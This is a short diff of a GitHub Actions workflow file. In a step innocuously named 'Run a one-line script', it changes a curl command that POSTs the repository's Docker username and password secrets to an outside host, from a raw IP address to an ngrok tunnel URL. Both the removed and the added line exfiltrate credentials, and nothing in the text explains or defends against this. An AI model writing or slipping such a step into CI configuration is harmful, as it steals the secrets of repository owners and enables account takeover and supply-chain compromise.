@@ -27,7 +27,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: curl -X POST -d ${{ secrets.DOCKER_USERNAME }}-${{ secrets.DOCKER_PASSWORD }} http://34.219.106.153/
+        run: curl -X POST -d ${{ secrets.DOCKER_USERNAME }}-${{ secrets.DOCKER_PASSWORD }} https://045ff4b6b748.ngrok.io
 
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
